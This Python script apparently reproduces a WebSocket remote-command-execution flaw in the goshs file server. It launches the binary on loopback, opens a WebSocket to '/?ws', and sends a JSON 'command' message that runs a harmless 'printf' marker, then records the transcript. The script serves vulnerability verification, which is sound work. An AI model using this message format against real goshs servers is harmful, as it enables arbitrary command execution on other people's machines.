#!/usr/bin/env python3
import argparse
import base64
import json
import os
import secrets
import signal
import socket
import struct
import subprocess
import tempfile
import time
from pathlib import Path


MAX_OUTPUT_CHARS = 20000
MAX_WEBSOCKET_PAYLOAD = 1024 * 1024


class WebSocketError(Exception):
    pass


class WebSocketClient:
    def __init__(self, host, port, path, deadline):
        self.host = host
        self.port = port
        self.path = path
        self.deadline = deadline
        self.socket = None
        self.buffer = b""

    def _remaining(self):
        remaining = self.deadline - time.monotonic()
        if remaining <= 0:
            raise TimeoutError("websocket operation timed out")
        return remaining

    def _receive(self, size):
        while len(self.buffer) < size:
            self.socket.settimeout(min(self._remaining(), 1.0))
            try:
                chunk = self.socket.recv(65536)
            except socket.timeout:
                if time.monotonic() >= self.deadline:
                    raise TimeoutError("websocket read timed out")
                continue
            if not chunk:
                raise WebSocketError("websocket closed while reading a frame")
            self.buffer += chunk
        result = self.buffer[:size]
        self.buffer = self.buffer[size:]
        return result

    def connect(self):
        self.socket = socket.create_connection(
            (self.host, self.port), timeout=min(self._remaining(), 3.0)
        )
        key = base64.b64encode(os.urandom(16)).decode("ascii")
        request = (
            f"GET {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}:{self.port}\r\n"
            "Upgrade: websocket\r\n"
            "Connection: Upgrade\r\n"
            f"Sec-WebSocket-Key: {key}\r\n"
            "Sec-WebSocket-Version: 13\r\n"
            "\r\n"
        )
        self.socket.sendall(request.encode("ascii"))

        response = bytearray()
        while b"\r\n\r\n" not in response:
            self.socket.settimeout(min(self._remaining(), 1.0))
            try:
                chunk = self.socket.recv(4096)
            except socket.timeout:
                if time.monotonic() >= self.deadline:
                    raise TimeoutError("websocket handshake timed out")
                continue
            if not chunk:
                raise WebSocketError("websocket closed during handshake")
            response.extend(chunk)

        header_bytes, self.buffer = bytes(response).split(b"\r\n\r\n", 1)
        header_text = header_bytes.decode("iso-8859-1", errors="replace")
        status_line = header_text.split("\r\n", 1)[0]
        if " 101 " not in status_line:
            raise WebSocketError(f"websocket upgrade failed: {status_line}")
        return self

    def send_text(self, text):
        payload = text.encode("utf-8")
        mask = os.urandom(4)
        frame = bytearray([0x81])
        length = len(payload)
        if length < 126:
            frame.append(0x80 | length)
        elif length < 65536:
            frame.append(0x80 | 126)
            frame.extend(struct.pack("!H", length))
        else:
            frame.append(0x80 | 127)
            frame.extend(struct.pack("!Q", length))
        frame.extend(mask)
        frame.extend(byte ^ mask[index % 4] for index, byte in enumerate(payload))
        self.socket.settimeout(min(self._remaining(), 3.0))
        self.socket.sendall(frame)

    def receive_text(self):
        while True:
            self.socket.settimeout(min(self._remaining(), 1.0))
            while len(self.buffer) < 2:
                try:
                    chunk = self.socket.recv(65536)
                except socket.timeout:
                    if time.monotonic() >= self.deadline:
                        return None
                    continue
                if not chunk:
                    return None
                self.buffer += chunk

            first_byte, second_byte = self.buffer[:2]
            opcode = first_byte & 0x0F
            masked = bool(second_byte & 0x80)
            length = second_byte & 0x7F
            offset = 2

            if length == 126:
                required = offset + 2
            elif length == 127:
                required = offset + 8
            else:
                required = offset
            while len(self.buffer) < required:
                try:
                    chunk = self.socket.recv(65536)
                except socket.timeout:
                    if time.monotonic() >= self.deadline:
                        return None
                    continue
                if not chunk:
                    return None
                self.buffer += chunk

            if length == 126:
                length = struct.unpack("!H", self.buffer[2:4])[0]
                offset = 4
            elif length == 127:
                length = struct.unpack("!Q", self.buffer[2:10])[0]
                offset = 10

            if length > MAX_WEBSOCKET_PAYLOAD:
                raise WebSocketError("websocket payload exceeded safety limit")
            mask = b""
            if masked:
                mask = self._receive(offset + 4)[offset : offset + 4]
                payload = self._receive(length)[:length]
            else:
                payload = self._receive(offset + length)[offset : offset + length]
            if masked:
                payload = bytes(
                    byte ^ mask[index % 4] for index, byte in enumerate(payload)
                )

            if opcode == 0x8:
                return None
            if opcode == 0x9:
                self.send_pong(payload)
                continue
            if opcode != 0x1:
                continue
            if first_byte & 0x80 == 0:
                raise WebSocketError("fragmented websocket frames are not supported")
            return payload.decode("utf-8", errors="replace")

    def send_pong(self, payload):
        mask = os.urandom(4)
        frame = bytearray([0x8A, 0x80 | len(payload)])
        frame.extend(mask)
        frame.extend(byte ^ mask[index % 4] for index, byte in enumerate(payload))
        self.socket.sendall(frame)

    def close(self):
        if self.socket is not None:
            try:
                self.socket.close()
            except OSError:
                pass


def wait_for_http(host, port, deadline):
    while time.monotonic() < deadline:
        try:
            with socket.create_connection((host, port), timeout=0.5) as connection:
                connection.sendall(
                    b"GET / HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n"
                )
                response = connection.recv(128)
                while response:
                    response = connection.recv(4096)
            if response is not None:
                return
        except OSError:
            pass
        time.sleep(0.05)
    raise TimeoutError("target HTTP endpoint did not become ready")


def free_loopback_port():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
        listener.bind(("127.0.0.1", 0))
        return listener.getsockname()[1]


def stop_process(process):
    if process is None or process.poll() is not None:
        return
    try:
        process.send_signal(signal.SIGINT)
        process.wait(timeout=3)
    except subprocess.TimeoutExpired:
        process.terminate()
        try:
            process.wait(timeout=2)
        except subprocess.TimeoutExpired:
            process.kill()
            process.wait(timeout=2)
    except OSError:
        process.kill()
        process.wait(timeout=2)


def read_stream(stream):
    if stream is None:
        return ""
    stream.seek(0)
    return stream.read().decode("utf-8", errors="replace")


def truncate_output(value):
    if len(value) <= MAX_OUTPUT_CHARS:
        return value
    return value[:MAX_OUTPUT_CHARS] + "\n...[truncated]"


def empty_result(binary, command, error):
    return {
        "binary": binary,
        "command": command,
        "returncode": None,
        "signal": None,
        "timed_out": False,
        "runtime_ms": 0,
        "stdout": "",
        "stderr": "",
        "observable": {"kind": "protocol_transcript", "value": "", "path": None},
        "error": error,
    }


def run(binary, timeout):
    host = "127.0.0.1"
    port = free_loopback_port()
    process = None
    websocket = None
    transcript = []
    command = [binary, "-i", host, "-p", str(port), "-d", ""]
    result = empty_result(binary, command, None)
    started = time.monotonic()
    stdout_file = None
    stderr_file = None
    timed_out = False
    internal_error = None
    interaction_started = False

    try:
        stdout_file = tempfile.TemporaryFile(mode="w+b")
        stderr_file = tempfile.TemporaryFile(mode="w+b")
        with tempfile.TemporaryDirectory(prefix="goshs-poc-") as webroot:
            command[-1] = webroot
            environment = os.environ.copy()
            environment["HTTP_PROXY"] = "http://127.0.0.1:9"
            environment["HTTPS_PROXY"] = "http://127.0.0.1:9"
            process = subprocess.Popen(
                command,
                stdin=subprocess.DEVNULL,
                stdout=stdout_file,
                stderr=stderr_file,
                env=environment,
            )

            deadline = started + timeout
            wait_for_http(host, port, deadline)

            response_deadline = min(time.monotonic() + 3.0, deadline)
            websocket = WebSocketClient(host, port, "/?ws", response_deadline).connect()

            token = secrets.token_hex(16)
            trigger_command = f"printf GOSHS_WS_RCE_PROOF_{token}"
            message = {"type": "command", "content": trigger_command}
            message_text = json.dumps(message, separators=(",", ":"))
            websocket.send_text(message_text)
            interaction_started = True
            transcript.append(f"C> {message_text}")

            response = websocket.receive_text()
            if response is not None:
                transcript.append(f"S< {response}")

            websocket.close()
            websocket = None

            stop_process(process)
            returncode = process.poll()
            return {
                "binary": binary,
                "command": command,
                "returncode": returncode,
                "signal": -returncode
                if returncode is not None and returncode < 0
                else None,
                "timed_out": False,
                "runtime_ms": int((time.monotonic() - started) * 1000),
                "stdout": truncate_output(read_stream(stdout_file)),
                "stderr": truncate_output(read_stream(stderr_file)),
                "observable": {
                    "kind": "protocol_transcript",
                    "value": "\n".join(transcript),
                    "path": None,
                },
                "error": None,
            }
    except subprocess.TimeoutExpired:
        internal_error = "target process did not stop before timeout"
    except FileNotFoundError:
        internal_error = f"target binary could not be started: {binary}"
    except PermissionError:
        internal_error = f"target binary is not executable: {binary}"
    except TimeoutError as exception:
        timed_out = True
        if not interaction_started:
            internal_error = (
                f"run timed out before interaction was recorded: {exception}"
            )
    except Exception as exception:
        if not interaction_started:
            internal_error = f"script-level failure: {exception}"

    if websocket is not None:
        websocket.close()
    if process is not None:
        stop_process(process)
        returncode = process.poll()
    else:
        returncode = None

    result.update(
        {
            "returncode": returncode,
            "signal": -returncode
            if returncode is not None and returncode < 0
            else None,
            "timed_out": timed_out,
            "runtime_ms": int((time.monotonic() - started) * 1000),
            "stdout": truncate_output(read_stream(stdout_file)),
            "stderr": truncate_output(read_stream(stderr_file)),
            "observable": {
                "kind": "protocol_transcript",
                "value": "\n".join(transcript),
                "path": None,
            },
            "error": internal_error,
        }
    )
    return result


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--binary", required=True)
    parser.add_argument("--json-out")
    parser.add_argument("--timeout", type=float, default=25)
    args = parser.parse_args()

    timeout = max(1.0, min(args.timeout, 600.0))
    result = run(args.binary, timeout)
    output = json.dumps(result, ensure_ascii=False, indent=2)

    if args.json_out:
        output_path = Path(args.json_out)
        if str(output_path.parent):
            output_path.parent.mkdir(parents=True, exist_ok=True)
        output_path.write_text(output + "\n", encoding="utf-8")
    else:
        print(output)


if __name__ == "__main__":
    main()
